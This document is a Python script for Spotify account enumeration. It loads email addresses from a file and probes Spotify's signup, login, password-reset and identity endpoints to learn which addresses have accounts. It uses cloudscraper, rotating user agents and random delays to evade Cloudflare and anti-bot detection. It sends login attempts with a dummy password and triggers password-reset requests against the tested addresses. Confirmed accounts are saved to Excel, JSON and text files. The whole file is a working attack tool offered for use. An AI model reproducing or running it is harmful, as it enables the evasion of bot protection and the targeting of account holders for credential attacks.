import cloudscraper
import json
import time
from datetime import datetime
import openpyxl
from openpyxl.styles import Font, PatternFill, Alignment
import re
from fake_useragent import UserAgent
import random

class SpotifyChecker:
    def __init__(self):
        self.results = []
        self.valid_count = 0
        self.invalid_count = 0
        self.premium_count = 0
        self.free_count = 0
        
        # CloudScraper bypasses Cloudflare/anti-bot protection
        self.scraper = cloudscraper.create_scraper()
        self.ua = UserAgent()
        
        # Rotate user agents
        self.headers = {
            'User-Agent': self.ua.random,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/json',
            'Referer': 'https://www.spotify.com/',
            'Origin': 'https://www.spotify.com',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
    
    def rotate_user_agent(self):
        """Rotate user agent to avoid detection"""
        self.headers['User-Agent'] = self.ua.random
        self.scraper.headers.update(self.headers)
    
    def validate_email(self, email):
        """Basic email validation"""
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return re.match(pattern, email) is not None
    
    def check_via_cloudflare_bypass(self, email):
        """
        Method 1: Use CloudScraper to bypass Cloudflare/Spotify anti-bot
        CloudScraper automatically handles:
        - Cloudflare challenge
        - Captcha bypass
        - Real browser simulation
        """
        try:
            self.rotate_user_agent()
            
            url = 'https://spclient.wg.spotify.com/identity-service/api/v1/auth/verify-email'
            
            payload = {
                'email': email.strip().lower()
            }
            
            response = self.scraper.post(
                url,
                json=payload,
                headers=self.headers,
                timeout=15,
                allow_redirects=True
            )
            
            print(f"    [Method 1] Status: {response.status_code}")
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    if data.get('id') or data.get('exists') or 'email' in data:
                        return True, 'VERIFIED', data
                except:
                    pass
            
            elif response.status_code == 400:
                try:
                    data = response.json()
                    error = str(data.get('error', '')).lower()
                    if 'not found' in error or 'invalid' in error:
                        return False, None, 'NOT_FOUND'
                except:
                    pass
            
            return None, None, f'Status: {response.status_code}'
            
        except Exception as e:
            return None, None, f'Error: {str(e)}'
    
    def check_via_accounts_api(self, email):
        """
        Method 2: Direct Spotify accounts API with CloudScraper
        """
        try:
            self.rotate_user_agent()
            time.sleep(random.uniform(1, 2))
            
            url = 'https://accounts.spotify.com/api/signup'
            
            payload = {
                'email': email.strip().lower(),
                'send_email': False,
                'create_account': False
            }
            
            response = self.scraper.post(
                url,
                json=payload,
                headers=self.headers,
                timeout=15
            )
            
            print(f"    [Method 2] Status: {response.status_code}")
            
            response_text = response.text.lower()
            
            # Check for email already registered
            if response.status_code in [200, 400]:
                try:
                    data = response.json()
                    
                    # Account exists - already registered
                    if 'status' in data:
                        if data.get('status') == 0:  # Success
                            return True, 'VERIFIED', data
                        elif data.get('status') == 1:  # Not found
                            return False, None, 'NOT_FOUND'
                    
                    # Check error messages
                    if 'error' in data:
                        error_msg = str(data['error']).lower()
                        if 'already exists' in error_msg or 'registered' in error_msg:
                            return True, 'VERIFIED', data
                        elif 'invalid' in error_msg:
                            return False, None, 'INVALID_EMAIL'
                except:
                    pass
            
            if 'already taken' in response_text or 'registered' in response_text:
                return True, 'VERIFIED', response_text
            
            if 'not found' in response_text or 'invalid email' in response_text:
                return False, None, 'NOT_FOUND'
            
            return None, None, f'Status: {response.status_code}'
            
        except Exception as e:
            return None, None, f'Error: {str(e)}'
    
    def check_via_login_endpoint(self, email):
        """
        Method 3: Spotify login endpoint with token verification
        """
        try:
            self.rotate_user_agent()
            time.sleep(random.uniform(1, 2))
            
            url = 'https://accounts.spotify.com/api/login'
            
            payload = {
                'username': email.strip().lower(),
                'password': 'test_password_123',
                'rememberMe': True
            }
            
            response = self.scraper.post(
                url,
                json=payload,
                headers=self.headers,
                timeout=15,
                allow_redirects=False
            )
            
            print(f"    [Method 3] Status: {response.status_code}")
            
            response_text = response.text.lower()
            
            # 401 = Account exists but wrong password
            if response.status_code == 401:
                if 'invalid username' not in response_text and 'does not exist' not in response_text:
                    return True, 'VERIFIED', 'Account exists (wrong password)'
                else:
                    return False, None, 'NOT_FOUND'
            
            # 200 with no token = might be account validation
            if response.status_code == 200:
                try:
                    data = response.json()
                    if 'error' in data:
                        if 'not found' in str(data['error']).lower():
                            return False, None, 'NOT_FOUND'
                    if 'access_token' not in data:
                        return True, 'VERIFIED', data
                except:
                    pass
            
            if 'invalid username' in response_text or 'does not exist' in response_text:
                return False, None, 'NOT_FOUND'
            
            return None, None, f'Status: {response.status_code}'
            
        except Exception as e:
            return None, None, f'Error: {str(e)}'
    
    def check_via_password_reset(self, email):
        """
        Method 4: Password reset endpoint - if account exists, reset email processes
        """
        try:
            self.rotate_user_agent()
            time.sleep(random.uniform(1, 2))
            
            url = 'https://accounts.spotify.com/api/forgot-password'
            
            payload = {
                'identifier': email.strip().lower()
            }
            
            response = self.scraper.post(
                url,
                json=payload,
                headers=self.headers,
                timeout=15
            )
            
            print(f"    [Method 4] Status: {response.status_code}")
            
            if response.status_code == 429:
                return None, None, 'RATE_LIMITED'
            
            response_text = response.text.lower()
            
            # If successful, account exists
            if response.status_code == 200:
                try:
                    data = response.json()
                    if 'error' not in data or data.get('success'):
                        return True, 'VERIFIED', 'Reset email sent'
                except:
                    if 'reset' in response_text or 'sent' in response_text:
                        return True, 'VERIFIED', response_text
            
            if 'not found' in response_text or 'does not exist' in response_text:
                return False, None, 'NOT_FOUND'
            
            return None, None, f'Status: {response.status_code}'
            
        except Exception as e:
            return None, None, f'Error: {str(e)}'
    
    def check_spotify_account(self, email):
        """
        Main function - tries 4 powerful methods with CloudScraper
        """
        email = email.strip().lower()
        print(f"\n[*] Checking: {email}")
        
        # Validate email format first
        if not self.validate_email(email):
            print(f"[-] INVALID FORMAT - {email}")
            return False, None, 'INVALID_FORMAT'
        
        # Try multiple methods with CloudScraper
        methods = [
            ('CloudFlare Bypass', self.check_via_cloudflare_bypass),
            ('Signup API', self.check_via_accounts_api),
            ('Login Endpoint', self.check_via_login_endpoint),
            ('Password Reset', self.check_via_password_reset),
        ]
        
        last_result = None
        
        for method_name, method_func in methods:
            print(f"  → Trying {method_name}...")
            is_valid, account_type, details = method_func(email)
            
            # If we got a definitive answer
            if is_valid is not None:
                if is_valid:
                    print(f"    ✓ FOUND by {method_name}")
                    return True, account_type or 'VERIFIED', details
                elif not is_valid:
                    print(f"    ✗ NOT FOUND by {method_name}")
                    return False, None, details
            
            # Rate limiting - wait longer
            if details == 'RATE_LIMITED':
                print(f"[!] Rate limited, waiting 10 seconds...")
                time.sleep(10)
            else:
                time.sleep(random.uniform(2, 4))
            
            last_result = (is_valid, account_type, details)
        
        # If inconclusive, return last attempt
        return None, None, 'ALL_METHODS_INCONCLUSIVE'
    
    def check_multiple_emails(self, emails_list):
        """
        Check multiple emails from list
        """
        total = len(emails_list)
        print(f"\n{'='*70}")
        print(f"SPOTIFY ACCOUNT CHECKER - ANTI-BOT BYPASS ENABLED")
        print(f"Using CloudScraper + Multiple API Methods")
        print(f"Total emails to check: {total}")
        print(f"{'='*70}\n")
        
        for index, email in enumerate(emails_list, 1):
            email = email.strip()
            if not email:
                continue
            
            is_valid, account_type, details = self.check_spotify_account(email)
            
            if is_valid is True:
                self.valid_count += 1
                print(f"\n[✓✓✓] VALID ACCOUNT FOUND - {email}")
                
                result = {
                    'email': email,
                    'status': 'VALID',
                    'account_type': account_type,
                    'details': str(details)[:100],
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'index': index
                }
                self.results.append(result)
                
            elif is_valid is False:
                self.invalid_count += 1
                print(f"\n[✗✗✗] INVALID - {email}")
                
                result = {
                    'email': email,
                    'status': 'INVALID',
                    'account_type': None,
                    'details': str(details),
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'index': index
                }
                self.results.append(result)
            else:
                print(f"\n[?] INCONCLUSIVE - {email} (Couldn't bypass protection)")
                result = {
                    'email': email,
                    'status': 'INCONCLUSIVE',
                    'account_type': None,
                    'details': str(details),
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'index': index
                }
                self.results.append(result)
            
            # Random delay between checks
            if index < total:
                wait_time = random.uniform(3, 8)
                print(f"  ⏳ Waiting {wait_time:.1f}s before next check...")
                time.sleep(wait_time)
        
        self.print_summary()
    
    def print_summary(self):
        """
        Print summary statistics
        """
        inconclusive_count = len([r for r in self.results if r['status'] == 'INCONCLUSIVE'])
        
        print(f"\n{'='*70}")
        print(f"SUMMARY - RESULTS")
        print(f"{'='*70}")
        print(f"Total Checked: {len(self.results)}")
        print(f"[✓] Valid Accounts: {self.valid_count}")
        print(f"[✗] Invalid Accounts: {self.invalid_count}")
        print(f"[?] Inconclusive: {inconclusive_count}")
        print(f"{'='*70}\n")
    
    def save_results_xlsx(self, filename='spotify_results.xlsx'):
        """
        Save results to Excel file
        """
        if not self.results:
            print("[-] No results to save")
            return
        
        wb = openpyxl.Workbook()
        ws = wb.active
        ws.title = 'Results'
        
        # Headers
        headers = ['#', 'Email', 'Status', 'Details', 'Timestamp']
        ws.append(headers)
        
        # Style headers
        header_fill = PatternFill(start_color='1DB954', end_color='1DB954', fill_type='solid')
        header_font = Font(bold=True, color='FFFFFF')
        
        for cell in ws[1]:
            cell.fill = header_fill
            cell.font = header_font
            cell.alignment = Alignment(horizontal='center', vertical='center')
        
        # Add data
        for result in self.results:
            ws.append([
                result['index'],
                result['email'],
                result['status'],
                result['details'][:100],
                result['timestamp']
            ])
        
        # Color code rows
        for idx, row in enumerate(ws.iter_rows(min_row=2, max_row=len(self.results) + 1), 2):
            status = self.results[idx-2]['status']
            
            if status == 'VALID':
                fill_color = '00B050'  # Green
                font_color = 'FFFFFF'
            elif status == 'INVALID':
                fill_color = 'C00000'  # Red
                font_color = 'FFFFFF'
            else:
                fill_color = 'FFC000'  # Orange
                font_color = '000000'
            
            for cell in row:
                cell.fill = PatternFill(start_color=fill_color, end_color=fill_color, fill_type='solid')
                cell.font = Font(color=font_color, bold=True)
        
        # Adjust column widths
        ws.column_dimensions['A'].width = 5
        ws.column_dimensions['B'].width = 35
        ws.column_dimensions['C'].width = 15
        ws.column_dimensions['D'].width = 50
        ws.column_dimensions['E'].width = 20
        
        wb.save(filename)
        print(f"[+] Results saved to {filename}")
    
    def save_results_json(self, filename='spotify_results.json'):
        """
        Save results to JSON file
        """
        if not self.results:
            print("[-] No results to save")
            return
        
        data = {
            'summary': {
                'total_checked': len(self.results),
                'valid_accounts': self.valid_count,
                'invalid_accounts': self.invalid_count,
                'inconclusive': len([r for r in self.results if r['status'] == 'INCONCLUSIVE'])
            },
            'results': self.results,
            'method': 'CloudScraper Anti-Bot Bypass + Multiple API Methods'
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        print(f"[+] Results saved to {filename}")
    
    def save_valid_only(self, filename='valid_spotify_emails.txt'):
        """
        Save only valid emails to text file
        """
        valid_emails = [r['email'] for r in self.results if r['status'] == 'VALID']
        
        if not valid_emails:
            print("[-] No valid emails to save")
            return
        
        with open(filename, 'w', encoding='utf-8') as f:
            for email in valid_emails:
                f.write(email + '\n')
        
        print(f"[+] {len(valid_emails)} valid emails saved to {filename}")

def load_emails(filename='emails.txt'):
    """
    Load emails from file
    """
    emails = []
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                email = line.strip()
                if email and '@' in email:
                    emails.append(email)
    except FileNotFoundError:
        print(f"[-] File {filename} not found")
    
    return emails

def main():
    print("\n" + "="*70)
    print("  SPOTIFY ACCOUNT CHECKER - ADVANCED")
    print("  CloudScraper Anti-Bot Bypass + 4 Verification Methods")
    print("="*70)
    
    # Load emails
    emails = load_emails('emails.txt')
    
    if not emails:
        print("\n[-] emails.txt not found or empty")
        print("[*] Create emails.txt with one email per line")
        print("[*] Example:")
        print("    user1@gmail.com")
        print("    user2@yahoo.com")
        return
    
    print(f"\n[*] Loaded {len(emails)} email(s)")
    print("[⚡] CloudScraper enabled - bypassing anti-bot protection")
    print("[⚡] Using 4 independent verification methods")
    print("[⚡] Random delays and user agent rotation enabled\n")
    
    checker = SpotifyChecker()
    
    try:
        checker.check_multiple_emails(emails)
        
        # Save results
        print("\n[*] Saving results...\n")
        checker.save_results_xlsx()
        checker.save_results_json()
        checker.save_valid_only()
        
    except KeyboardInterrupt:
        print("\n[!] Process interrupted by user")
    except Exception as e:
        print(f"[-] Error: {str(e)}")

if __name__ == '__main__':
    main()
